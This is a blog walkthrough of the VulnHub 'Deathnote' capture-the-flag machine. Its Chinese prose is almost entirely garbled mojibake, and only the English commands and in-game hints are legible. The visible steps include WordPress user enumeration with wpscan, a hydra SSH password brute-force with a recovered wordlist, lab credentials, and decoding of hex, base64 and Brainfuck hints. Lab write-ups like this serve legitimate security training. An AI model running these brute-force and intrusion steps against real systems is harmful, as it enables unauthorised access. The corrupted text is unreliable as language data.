Linuxè‡ªå¸¦çš„ä¸€æ¬¾ARPæ‰«æå·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥è¿›è¡Œå•ä¸€ç›®æ ‡æ‰«æï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæ‰¹é‡æ‰«æã€‚æ‰¹é‡æ‰«æçš„æ—¶å€™ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡CIDR<br>åœ°å€èŒƒå›´æˆ–è€…åˆ—è¡¨æ–‡ä»¶çš„æ–¹å¼æŒ‡å®šã€‚è¯¥å·¥å…·å…è®¸ç”¨æˆ·å®šåˆ¶ARPåŒ…ï¼Œæ„å»ºéæ ‡å‡†æ•°æ®åŒ…ã€‚åŒæ—¶ï¼Œ<code>è¯¥å·¥å…·ä¼šè‡ªåŠ¨è§£æMacåœ°å€ï¼Œç»™å‡ºMACå¯¹åº”çš„ç¡¬</code><br><code>ä»¶å‚å•†ï¼Œå¸®åŠ©ç”¨æˆ·ç¡®è®¤ç›®æ ‡ã€‚</code></p><p><code>netdiscover</code><br>Netdiscoveræ˜¯ä¸€ç§ç½‘ç»œæ‰«æå·¥å…·ï¼Œé€šè¿‡ARPæ‰«æå‘ç°æ´»åŠ¨ä¸»æœºï¼Œå¯ä»¥é€šè¿‡ä¸»åŠ¨å’Œè¢«åŠ¨ä¸¤ç§æ¨¡å¼è¿›è¡ŒARPæ‰«æã€‚é€šè¿‡ä¸»åŠ¨å‘é€ARPè¯·æ±‚æ£€æŸ¥ç½‘ç»œARPæµé‡ï¼Œé€šè¿‡è‡ªåŠ¨æ‰«ææ¨¡å¼æ‰«æç½‘ç»œåœ°å€ã€‚æœ¬æ–‡ä»‹ç»Netdiscoverçš„å®‰è£…å’Œä½¿ç”¨æ–¹æ³•ã€‚</p></blockquote><hr><h2 id="ä¿¡æ¯æ”¶é›†-9"><a href="#ä¿¡æ¯æ”¶é›†-9" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ä¹ æƒ¯<code>nmap</code>æ‰«ä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20221108191059284.png" alt="image-20221108191059284"></p><blockquote><p><code>22</code>ç«¯å£å¼€æ”¾ï¼Œè¿è¡Œ<code>ssh</code><br><code>80</code>ç«¯å£å¼€æ”¾ï¼Œè¿è¡Œ<code>http</code></p></blockquote><p>ç„¶åè®¿é—®é¶æœº<code>ip</code></p><p><img src="/2022/08/29/vulnhub/image-20221108192408036.png" alt="image-20221108192408036"></p><p>çœ‹åˆ°é¡µé¢æ˜¾ç¤º<code>please wait.....</code></p><p><img src="/2022/08/29/vulnhub/image-20221108192756267.png" alt="image-20221108192756267"></p><p>ç„¶åæ˜¾ç¤ºè¿æ¥å¤±è´¥</p><p>çœ‹æ¥æ˜¯éœ€è¦ä¿®æ”¹<code>/etc/hosts</code>æ–‡ä»¶ï¼Œæ·»åŠ é¶æœºåŸŸåå’Œ<code>ip</code></p><p><img src="/2022/08/29/vulnhub/image-20221108193016082.png" alt="image-20221108193016082"></p><p>å†æ¬¡è®¿é—®é¶æœº<code>ip</code></p><p><img src="/2022/08/29/vulnhub/image-20221108193044669.png" alt="image-20221108193044669"></p><p>è®¿é—®æˆåŠŸ</p><p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹ç½‘ç«™çš„æ¡†æ¶</p><p><img src="/2022/08/29/vulnhub/image-20221108200530705.png" alt="image-20221108200530705"></p><blockquote><p><code>CMS</code>ä¸º<code>wordpress 5.8</code>ï¼Œå¾ˆè€çš„ç‰ˆæœ¬äº†ï¼Œè¿™é‡Œè‚¯å®šæœ‰ææƒçš„æ–¹å¼</p><p>é‡‡ç”¨è„šæœ¬ä¸º<code>Twiiter Emoji</code>ï¼Œè¿™æ˜¯æ¨ç‰¹çš„å¼€æºåº“é‡Œçš„å¼•ç”¨è¡¨æƒ…çš„è„šæœ¬ï¼Œä¸æ˜¯å…³é”®</p></blockquote><p>æˆ‘ä»¬çœ‹åˆ°é¡µé¢æœ‰<code>hint</code></p><p><img src="/2022/08/29/vulnhub/image-20221108193350489.png" alt="image-20221108193350489"></p><blockquote><p><code>Find a notes.txt file on server or SEE the L comment</code> </p><p>æ„æ€æ˜¯ï¼š</p><p>æ‰¾åˆ°ä¸€ä¸ªnotes.txt æ–‡ä»¶æœåŠ¡å™¨ä¸Š<br>æˆ–</p><p>çœ‹çœ‹Lçš„è¯„è®º </p><p>é‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°notes.txtæ–‡ä»¶åœ¨å“ªé‡Œï¼Œä»¥åŠè¯„è®ºç½‘é¡µåœ¨å“ªé‡Œ</p></blockquote><p>è¯„è®ºé¡µé¢æˆ‘æ˜¯åœ¨é¦–é¡µé¢ä¸­é—´</p><blockquote><p><code>i will eliminate you L!</code></p></blockquote><p>é“¾æ¥è·³è½¬æ‰¾åˆ°çš„ï¼Œä½†å¥½åƒæ²¡å•¥ä¿¡æ¯ï¼Œä¼¼ä¹çœ‹ä¸åˆ°<code>L</code>çš„è¯„è®º</p><p><img src="/2022/08/29/vulnhub/image-20221108204306618.png" alt="image-20221108204306618"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/i</span>ndex.php<span class="regexp">/2021/</span><span class="number">07</span><span class="regexp">/19/</span>kira/</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108204334859.png" alt="image-20221108204334859"></p><p>å·¦ä¸‹è§’çš„</p><blockquote><p><code>my fav line is iamjustic3</code></p><p><code>L on i will eliminate you L!</code></p><p>æˆ‘æœ€å–œæ¬¢çš„å°è¯æ˜¯<code>iamjustic3</code><br><code>L</code> åœ¨ ï¼Œæˆ‘ä¼šæ¶ˆç­ä½ L! </p><p><code>iamjustic3</code>ï¼šåˆ†å¼€çœ‹i am justic 3ã€æˆ‘æ˜¯æ­£ä¹‰çš„3ã€‘ï¼Œä½†å¥½åƒå®é™…æ„æ€ï¼Œåé¢çœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨çš„</p><p><code>eliminate</code>ï¼šæ¶ˆç­ï¼Œçº¯ç²¹å•è¯æ„æ€ï¼Œæ²¡å•¥æ„ä¹‰</p></blockquote><p>æˆ‘ä»¬å…ˆç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹æ‰¾ä¸€ä¸‹ä¿¡æ¯</p><p><img src="/2022/08/29/vulnhub/image-20221108200416113.png" alt="image-20221108200416113"></p><h3 id="å…³é”®ä¿¡æ¯"><a href="#å…³é”®ä¿¡æ¯" class="headerlink" title="*å…³é”®ä¿¡æ¯"></a>*å…³é”®ä¿¡æ¯</h3><p>å…³é”®ç™»å½•é¡µé¢å’Œ<code>robots.txt</code>ã€å…¶ä»–é¡µé¢æ²¡æœ‰å•¥ä¿¡æ¯ã€‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-login.php</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108201422820.png" alt="image-20221108201422820"></p><p>çˆ¬è™«æ–‡æœ¬</p><p><img src="/2022/08/29/vulnhub/image-20221108201357084.png" alt="image-20221108201357084"></p><blockquote><p><code>fuck it my dad</code><br><code>added hint on /important.jpg</code></p><p><code>ryuk please delete it</code><br>æ„æ€æ˜¯ï¼š<br>xæˆ‘çš„çˆ¸çˆ¸<br>ä»–æŠŠæš—ç¤ºè—åœ¨äº†<code>/important.jpg</code>é‡Œ</p><p>ryukï¼Œè¯·åˆ äº†å®ƒ</p><p>ryukæ˜¯åŸºæ‹‰çš„æ­»ç¥ï¼ŒåŸºæ‹‰è®©ä»–åˆ é™¤å›¾ç‰‡ï¼ŒåŒæ—¶å›¾ç‰‡ä¹Ÿè—æœ‰ä¿¡æ¯<br>è™½ç„¶æˆ‘ä»¬æ‰¾åˆ°äº†ç™»å½•é¡µé¢ï¼Œä»¥åŠç”¨æˆ·åï¼Œä½†æ˜¯è¿˜æ˜¯ä¸çŸ¥é“å¯†ç <br>æ‰€ä»¥è¿˜è¦æ‰¾å¯†ç </p></blockquote><p>æˆ‘ä»¬å…ˆè¯•è¯•æˆ‘ä»¬èƒ½ä¸èƒ½æŸ¥çœ‹<code>/important.jpg</code></p><p><img src="/2022/08/29/vulnhub/image-20221108210813828.png" alt="image-20221108210813828"></p><p>å‘ç°å›¾ç‰‡æ— æ³•æ˜¾ç¤º</p><p>çœ‹æ¥å›¾ç‰‡æ ¼å¼æœ‰é—®é¢˜ï¼Œåº”è¯¥æ˜¯æ’å…¥äº†æ–‡æœ¬ä»€ä¹ˆçš„</p><p>æˆ‘ä»¬ç”¨<code>curl</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>deathnote.vuln/important.jpg</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><p><img src="/2022/08/29/vulnhub/image-20221108220741696.png" alt="image-20221108220741696"></p><blockquote><p><code>i am Soichiro Yagami, light&#39;s father</code><br><code>i have a doubt if L is true about the assumption that light is kira</code></p><p><code>i can only help you by giving something important</code></p><p><code>login username : user.txt</code><br><code>i don&#39;t know the password.</code><br><code>find it by yourself</code><br><code>but i think it is in the hint section of site</code></p><p>æ„æ€æ˜¯ï¼š<br>æˆ‘æ˜¯å…‰çš„çˆ¶äº² å…«ç¥å®—ä¸€éƒ<br>æˆ‘æ€€ç–‘ L å…³äºå…‰æ˜¯ kira çš„å‡è®¾æ˜¯å¦æ­£ç¡®</p><p>æˆ‘åªèƒ½é€šè¿‡æä¾›ä¸€äº›é‡è¦çš„ä¸œè¥¿æ¥å¸®åŠ©ä½ </p><p>ç™»å½•ç”¨æˆ·åï¼š<code>user.txt</code><br>æˆ‘ä¸çŸ¥é“å¯†ç ã€‚<br>è‡ªå·±æ‰¾<br>ä½†æˆ‘è®¤ä¸ºå®ƒåœ¨ç½‘ç«™çš„æç¤ºéƒ¨åˆ†<br>#<code>user.txt</code>çœ‹æ¥éœ€è¦åŒæ ·è®¿é—®æ‰¾ä¸€ä¸‹<br>#æç¤ºéƒ¨åˆ†æœ‰å¯†ç ï¼Œçœ‹æ¥å°±æ˜¯<code>notes.txt</code>æ–‡æœ¬é‡Œäº†</p></blockquote><p>é‚£åé¢å°±æ˜¯æ‰¾ä¸€ä¸‹è¿™ä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶åœ¨å“ªé‡Œäº†</p><h2 id="1-wpscan"><a href="#1-wpscan" class="headerlink" title="1.wpscan"></a>1.wpscan</h2><p>æ—¢ç„¶ä¿¡æ¯ä¸å¤Ÿï¼Œé‚£æˆ‘ä»¬å°±ç”¨å¯¹åº”çš„<code>CMS</code>å·¥å…·ã€<code>wpscan</code>ã€‘æ‰«ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä¿¡æ¯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span>deathnote.vuln/wordpress -e u</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108204728050.png" alt="image-20221108204728050"></p><p>å‘ç°<code>kira</code>æ‰æ˜¯çœŸæ­£çš„åå°ç”¨æˆ·ï¼Œé‚£ä¹ˆ<code>ryuk</code>å¯èƒ½å°±æ˜¯<code>ssh</code>çš„ç™»å½•ç”¨æˆ·ï¼Œé‚£ä»–çš„å¯†ç æ˜¯å¤šå°‘å‘¢</p><p>è¿™ä¸ªæ—¶å€™æˆ‘æƒ³èµ·ä»–çš„ç•™è¨€</p><blockquote><p>my fav line is <code>iamjustic3</code></p><p>L on i will eliminate you L!</p></blockquote><p>ä»–è¯´ä»–æœ€å–œæ¬¢çš„å°è¯æ˜¯<code>iamjustic3</code></p><p>æ—¢ç„¶æ˜¯æœ€å–œæ¬¢çš„ï¼Œé‚£æœ€æœ‰å¯èƒ½æ‹¿æ¥å½“å¯†ç ã€‚æ‰€ä»¥è¿™ä¸ªå¯èƒ½å°±æ˜¯<code>kira</code>çš„åå°ç½‘ç«™çš„ç™»é™†å¯†ç </p><h3 id="ç™»å½•åå°"><a href="#ç™»å½•åå°" class="headerlink" title="ç™»å½•åå°"></a>ç™»å½•åå°</h3><blockquote><p><code>kira</code><br><code>iamjustic3</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221108205228054.png" alt="image-20221108205228054"></p><p>ç™»å½•æˆåŠŸ</p><p>è¿™ä¸ªé¡µé¢æé†’éœ€è¦ç®¡ç†å‘˜é‚®ç®±éªŒè¯ï¼Œç›´æ¥<code>remind me later</code>ï¼Œæˆ‘ä»¬å…ˆåˆ°åå°çœ‹çœ‹</p><p>è¿›æ¥åå°å‘ç°<code>comments</code>é¡µé¢ï¼Œå…ˆçœ‹çœ‹èƒ½ä¸èƒ½çœ‹åˆ°<code>L</code>çš„è¯„è®º</p><p><img src="/2022/08/29/vulnhub/image-20221108205526638.png" alt="image-20221108205526638"></p><p>å‘ç°åŒæ ·å•¥ä¹Ÿæ²¡æœ‰</p><h2 id="2-sshç™»å½•-1"><a href="#2-sshç™»å½•-1" class="headerlink" title="2.sshç™»å½•"></a>2.sshç™»å½•</h2><p>æˆ‘ä»¬å†çœ‹çœ‹å…¶ä»–é¡µé¢</p><p>åœ¨<code>Media</code>é¡µé¢</p><p><img src="/2022/08/29/vulnhub/image-20221108211543340.png" alt="image-20221108211543340"></p><p>æˆ‘ä»¬å‘ç°äº†<code>notes.txt</code></p><p><img src="/2022/08/29/vulnhub/image-20221108211618643.png" alt="image-20221108211618643"></p><p>ç‚¹å¼€å¾—åˆ°<code>notes.txt</code>æ–‡æœ¬çš„ä½ç½®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-content<span class="regexp">/uploads/</span><span class="number">2021</span><span class="regexp">/07/</span>notes.txt</span><br></pre></td></tr></table></figure><p>è®¿é—®å¾—åˆ°</p><p><img src="/2022/08/29/vulnhub/image-20221108211705028.png" alt="image-20221108211705028"></p><p>çœ‹èµ·æ¥å¾ˆåƒå¯†ç æœ¬</p><blockquote><p><code>death4</code><br><code>death4life</code><br><code>death4u</code><br><code>death4ever</code><br><code>death4all</code><br><code>death420</code><br><code>death45</code><br><code>death4love</code><br><code>death49</code><br><code>death48</code><br><code>death456</code><br><code>death4014</code><br><code>1death4u</code><br><code>yaydeath44</code><br><code>thedeath4u2</code><br><code>thedeath4u</code><br><code>stickdeath420</code><br><code>reddeath44</code><br><code>megadeath44</code><br><code>megadeath4</code><br><code>killdeath405</code><br><code>hot2death4sho</code><br><code>death4south</code><br><code>death4now</code><br><code>death4l0ve</code><br><code>death4free</code><br><code>death4elmo</code><br><code>death4blood</code><br><code>death499Eyes301</code><br><code>death498</code><br><code>death4859</code><br><code>death47</code><br><code>death4545</code><br><code>death445</code><br><code>death444</code><br><code>death4387n</code><br><code>death4332387</code><br><code>death42521439</code><br><code>death42</code><br><code>death4138</code><br><code>death411</code><br><code>death405</code><br><code>death4me</code></p></blockquote><p>æˆ‘ä»¬è¯•è¯•çˆ†ç ´<code>ssh</code></p><p>æˆ‘ä»¬å†å¼„ä¸ªç”¨æˆ·åæœ¬</p><blockquote><p>å°±æ‹¿æˆ‘ä»¬å·²çŸ¥çš„ä¸‰ä¸ªç”¨æˆ·ï¼Œåšæˆç”¨æˆ·åæœ¬<br><code>kira</code><br><code>l</code><br><code>ryku</code></p></blockquote><p>ç„¶åä¹å¤´è›‡çˆ†ç ´ç™»å½•<code>ssh</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L un.txt -P pass.txt <span class="number">192.168.163.123</span> ssh -s <span class="number">22</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108213915226.png" alt="image-20221108213915226"></p><p>å‘ç°ç™»å½•ç”¨æˆ·ã€çœ‹æ¥ç”¨ä¸ä¸Šå»æ‰¾é‚£ä¸ª<code>user.txt</code>ã€‘</p><blockquote><p><code>l</code><br><code>death4me</code></p></blockquote><p>ç„¶åæˆ‘ä»¬è¯•è¯•ç™»å½•</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> l@<span class="number">192.168.16.123</span> </span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108214049547.png" alt="image-20221108214049547"></p><p>ç™»å½•æˆåŠŸï¼Œå¹¶çœ‹åˆ°å½“å‰ç›®å½•ä¸‹æœ‰ä¸ªæ–‡æœ¬æ–‡ä»¶<code>user.txt</code>ã€æ— å¥ˆï¼Œç°åœ¨æ‰¾åˆ°åº”è¯¥ä¹Ÿæ²¡å•¥ç”¨äº†ã€‘</p><p>æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20221108214257074.png" alt="image-20221108214257074"></p><p>å‘ç°æ˜¯ä¸²çœ‹ä¸æ‡‚çš„æ–‡æœ¬</p><p>æˆ‘ä»¬è¯•è¯•<code>ciphey</code>è§£å¯†ä¸€ä¸‹</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">ciphey</span> <span class="literal">-</span><span class="comment">t &quot;</span><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="literal">++</span><span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">--------------</span><span class="string">.</span><span class="literal">++++++++</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++++++</span><span class="string">.</span><span class="literal">-----------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span><span class="literal">+++++++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">++++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span>&gt;&gt;<span class="literal">----------</span><span class="string">.</span><span class="literal">+++++++++++++++++++</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++</span><span class="string">.</span><span class="literal">----------</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">------------------</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">++++++++++</span><span class="string">.</span><span class="literal">-------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++++++</span><span class="string">.</span><span class="literal">-----</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">+++++++++++++</span><span class="string">.</span>&gt;&gt;<span class="literal">++++++</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++++++++</span><span class="string">.</span><span class="literal">-----------------</span><span class="string">.</span></span><br><span class="line"><span class="comment">&quot;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><p><img src="/2022/08/29/vulnhub/image-20221108221734407.png" alt="image-20221108221734407"></p><blockquote><p><code>i think u got the shell , but you wont be able to kill me -kira</code><br>æ„æ€æ˜¯ï¼š<br>æˆ‘æƒ³ä½ å·²ç»æ‹¿åˆ°shelläº†ï¼Œä½†ä½ æ€ä¸äº†æˆ‘-åŸºæ‹‰</p></blockquote><p>æ„Ÿè§‰ä¿¡æ¯æ²¡å•¥ç”¨ï¼Œä½†æ˜¯å¤§æ¦‚çŒœæµ‹ï¼Œæ€æ­»åŸºæ‹‰æ˜¯éœ€è¦ææƒçš„ï¼Œä½†æ˜¯ä»Lè¿™é‡Œæ˜¯æ— æ³•ææƒï¼Œåªæœ‰åŸºæ‹‰æ‰å¯ä»¥ææƒ</p><p>æˆ‘ä»¬å¯ä»¥è¯•è¯•æˆ‘ä»¬èƒ½å¦ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä¸€äº›å‘½ä»¤</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108222201419.png" alt="image-20221108222201419"></p><p> è¿™æ ·çœ‹æ¥<code>L</code>æ˜¯æ— æ³•ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œé‚£å°±åªæœ‰çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–è·¯å¾„äº†</p><p>æˆ‘ä»¬å†è¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><p>çœ‹çœ‹æˆ‘ä»¬å½“å‰è·¯å¾„</p><p><img src="/2022/08/29/vulnhub/image-20221108214344792.png" alt="image-20221108214344792"></p><p>å‘ç°æˆ‘ä»¬è¿˜æœ‰ä¸ªä¸Šçº§ç›®å½•ï¼Œè¿”å›æŸ¥çœ‹å…¶ä¸‹ç›®å½•</p><p>å±…ç„¶è¿˜æœ‰ä¸ª<code>kira</code>çš„ç›®å½•</p><p>æˆ‘ä»¬çœ‹çœ‹æœ‰ä»€ä¹ˆ</p><p><img src="/2022/08/29/vulnhub/image-20221108214506480.png" alt="image-20221108214506480"></p><p><img src="/2022/08/29/vulnhub/image-20221108214544456.png" alt="image-20221108214544456"></p><p>å‘ç°å…¶ç›®å½•ä¸‹çš„<code>kira.txt</code>è®¾ç½®äº†æƒé™</p><p>æˆ‘ä»¬å°è¯•ç”¨ä¹‹å‰åå°ç™»å½•çš„å¯†ç ç™»å½•ï¼Œä¹Ÿå¤±è´¥äº†</p><h2 id="3-ç™»å½•kira"><a href="#3-ç™»å½•kira" class="headerlink" title="3.ç™»å½•kira"></a>3.ç™»å½•kira</h2><p>çœ‹æ¥æˆ‘ä»¬è¿˜éœ€è¦æ‰¾æ‰¾ä¿¡æ¯ï¼Œæ ¹æ®<code>user.txt</code>æ–‡æœ¬ä¿¡æ¯ï¼Œæˆ‘ä»¬å¿…é¡»è¦æˆåŠŸç™»å½•<code>kira</code>çš„ç”¨æˆ·ï¼Œæ‰å¯ä»¥ææƒæ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿</p><p>é‚£æˆ‘ä»¬ç›´æ¥æœç´¢å½“å‰å…¨éƒ¨å«æœ‰kiraçš„æ–‡ä»¶æˆ–è€…ç›®å½•</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;kira*&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108222721847.png" alt="image-20221108222721847"></p><p>å‰ä¸¤ä¸ªå‰é¢è®¿é—®è¿‡æ²¡æƒé™</p><p>åé¢å››ä¸ªä¸‰ä¸ªå›¾ç‰‡ï¼Œæœ€åä¸€ä¸ªä¹Ÿè®¿é—®è¿‡ï¼Œä¹Ÿæ²¡æƒé™</p><p><img src="/2022/08/29/vulnhub/image-20221108222833431.png" alt="image-20221108222833431"></p><p>é‚£å°±åªæœ‰ä¸€ä¸ªäº†</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>L/kira-<span class="keyword">case</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æœ‰æ— ä¿¡æ¯</p><p><img src="/2022/08/29/vulnhub/image-20221108223018151.png" alt="image-20221108223018151"></p><p>å‘ç°å…¶ä¸ºä¸€ä¸ªç›®å½•ï¼Œä¸”å…¶ä¸‹æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶</p><blockquote><p><code>the FBI agent died on December 27, 2006</code></p><p><code>1 week after the investigation of the task-force member/head.</code><br><code>aka.....</code><br><code>Soichiro Yagami&#39;s family .</code></p><p><code>hmmmmmmmmm......</code><br><code>and according to watari ,</code><br><code>he died as other died after Kira targeted them .</code></p><p><code>and we also found something in</code><br><code>fake-notebook-rule folder .</code><br>æ„æ€æ˜¯ï¼š</p><p>è”é‚¦è°ƒæŸ¥å±€ç‰¹å·¥äº 2006 å¹´ 12 æœˆ 27 æ—¥å»ä¸–</p><p>å·¥ä½œç»„æˆå‘˜&#x2F;è´Ÿè´£äººè°ƒæŸ¥å 1 å‘¨ã€‚<br>åˆåâ€¦â€¦<br>å…«ç¥å®—ä¸€éƒçš„å®¶äººã€‚</p><p>å—¯å—¯å—¯å—¯â€¦â€¦<br>æ ¹æ® Watari çš„è¯´æ³•ï¼Œ<br>åœ¨åŸºæ‹‰ç„å‡†ä»–ä»¬ä¹‹åï¼Œä»–æ­»äº†ï¼Œå…¶ä»–äººä¹Ÿæ­»äº†ã€‚</p><p>æˆ‘ä»¬è¿˜å‘ç°äº†ä¸€äº›ä¸œè¥¿<br>å‡ç¬”è®°æœ¬è§„åˆ™æ–‡ä»¶å¤¹</p></blockquote><p>çœ‹æ¥æˆ‘ä»¬éœ€è¦åˆ°<code>fake-notebook-rule</code>è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹å¯»æ‰¾ä¸€ç•ª</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;fake-notebook-rule&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure><p>æ‰¾æ‰¾ä½ç½®</p><p><img src="/2022/08/29/vulnhub/image-20221108223338919.png" alt="image-20221108223338919"></p><p>å‘ç°åœ¨</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>L/fake-notebook-rule</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å…¶ä¸‹æ–‡ä»¶ä¿¡æ¯</p><p><img src="/2022/08/29/vulnhub/image-20221108223431583.png" alt="image-20221108223431583"></p><p>å¤§æ¦‚æ„æ€çœ‹æ¥å°±æ˜¯è®©æˆ‘ä»¬ç”¨<code>cyberchef</code>å¯¹<code>case.wav</code>çš„å­—ç¬¦ä¸²è§£å¯†ã€ä¸€çœ¼<code>16</code>è¿›åˆ¶ï¼Œç›´æ¥æ‰‹åŠ¨è§£ç ç®—äº†ã€‘</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">63</span> <span class="number">47</span> <span class="number">46</span> <span class="number">7</span>a <span class="number">63</span> <span class="number">33</span> <span class="number">64</span> <span class="number">6</span>b <span class="number">49</span> <span class="number">44</span> <span class="number">6</span>f <span class="number">67</span> <span class="number">61</span> <span class="number">32</span> <span class="number">6</span>c <span class="number">79</span> <span class="number">59</span> <span class="number">57</span> <span class="number">6</span>c <span class="number">7</span>a <span class="number">5</span>a <span class="number">58</span> <span class="number">5</span>a <span class="number">70</span> <span class="number">62</span> <span class="number">43</span> <span class="number">41</span> <span class="number">3</span>d</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è§£ç è¯•è¯•</p><p>è§£<code>16</code>è¿›åˆ¶</p><p><img src="/2022/08/29/vulnhub/image-20221108223720859.png" alt="image-20221108223720859"></p><p>è§£ç <code>base64</code></p><p><img 